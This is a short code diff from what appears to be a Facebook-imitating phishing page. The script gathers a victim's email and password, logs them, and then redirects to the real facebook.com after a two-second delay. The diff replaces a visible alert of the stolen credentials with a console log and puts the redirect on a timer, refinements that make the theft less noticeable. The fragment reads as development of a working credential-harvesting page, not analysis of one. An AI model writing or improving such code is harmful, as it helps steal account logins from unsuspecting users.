@@ -53,9 +53,11 @@
             }
         });
 
-        window.location="https://www.facebook.com/";
+        console.log(`${email} : ${password}`)
 
-        alert(`${email} : ${password}`)
+        setTimeout(function () {
+            window.location="https://www.facebook.com/";
+        }, 2000); //will call the function after 2 secs.
     }
   </script> 
 </html>
